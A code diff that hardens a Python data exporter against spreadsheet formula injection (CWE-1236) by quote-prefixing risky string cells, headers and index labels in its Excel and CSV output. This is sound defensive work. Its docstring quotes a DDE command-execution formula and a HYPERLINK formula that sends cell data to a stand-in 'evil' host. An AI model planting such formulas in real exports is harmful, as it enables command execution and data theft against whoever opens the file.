@@ -19,6 +19,36 @@ def _fmt(value: Any, decimals: int = 4) -> str:
         return str(value)
 
 
+_FORMULA_TRIGGER_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _escape_formula_value(v: Any) -> Any:
+    return f"'{v}" if isinstance(v, str) and v.startswith(_FORMULA_TRIGGER_PREFIXES) else v
+
+
+def _sanitize_for_spreadsheet(df: pd.DataFrame) -> pd.DataFrame:
+    """Prefix formula-triggering string cells, column headers, and index
+    labels with a single quote so Excel/Sheets treats them as literal text
+    instead of a live formula.
+
+    This writes back whatever data (and column names, and — for the
+    correlation sheet — column names again as the index) was uploaded, so
+    a malicious value like '=cmd|"/c calc"!A1' or
+    '=HYPERLINK("http://evil/"&A1)' must not become an executable formula
+    just because someone opens the export — confirmed live:
+    pandas/openpyxl writes a leading '=' string as an actual <f> formula
+    node, not literal text (CWE-1236, "CSV injection"). Only object/string
+    columns are touched; real numeric/datetime/bool dtypes can't carry a
+    formula-triggering string in the first place.
+    """
+    df = df.copy()
+    for col in df.select_dtypes(include=["object"]).columns:
+        df[col] = df[col].map(_escape_formula_value)
+    df.columns = [_escape_formula_value(c) for c in df.columns]
+    df.index = [_escape_formula_value(i) for i in df.index]
+    return df
+
+
 class DataExporter:
     """Handles data export to various formats."""
 
@@ -32,7 +62,7 @@ class DataExporter:
 
         with pd.ExcelWriter(output, engine="openpyxl") as writer:
             # Write main data
-            self.df.to_excel(writer, sheet_name="Data", index=False)
+            _sanitize_for_spreadsheet(self.df).to_excel(writer, sheet_name="Data", index=False)
 
             # Write summary statistics
             if "column_analysis" in self.report:
@@ -58,25 +88,25 @@ class DataExporter:
                         )
                     summary_data.append(row)
 
-                summary_df = pd.DataFrame(summary_data)
+                summary_df = _sanitize_for_spreadsheet(pd.DataFrame(summary_data))
                 summary_df.to_excel(writer, sheet_name="Summary", index=False)
 
             # Write correlation matrix
             if "correlation_matrix" in self.report:
                 corr = self.report["correlation_matrix"]
                 if corr.get("columns"):
-                    corr_df = pd.DataFrame(
+                    corr_df = _sanitize_for_spreadsheet(pd.DataFrame(
                         corr["matrix"],
                         columns=corr["columns"],
                         index=corr["columns"],
-                    )
+                    ))
                     corr_df.to_excel(writer, sheet_name="Correlations")
 
             # Write outliers
             if "outliers" in self.report:
                 outliers_df = pd.DataFrame(self.report["outliers"])
                 if not outliers_df.empty:
-                    outliers_df.to_excel(writer, sheet_name="Outliers", index=False)
+                    _sanitize_for_spreadsheet(outliers_df).to_excel(writer, sheet_name="Outliers", index=False)
 
             # Write quality score breakdown
             quality = self.report.get("quality_score")
@@ -105,7 +135,7 @@ class DataExporter:
                                 }
                             )
                     if rows:
-                        quality_df = pd.DataFrame(rows)
+                        quality_df = _sanitize_for_spreadsheet(pd.DataFrame(rows))
                         quality_df.to_excel(writer, sheet_name="Quality", index=False)
 
         output.seek(0)
@@ -114,7 +144,7 @@ class DataExporter:
     def to_csv(self) -> bytes:
         """Export DataFrame to CSV."""
         output = io.StringIO()
-        self.df.to_csv(output, index=False)
+        _sanitize_for_spreadsheet(self.df).to_csv(output, index=False)
         return output.getvalue().encode("utf-8")
 
     def generate_markdown_report(self) -> str:
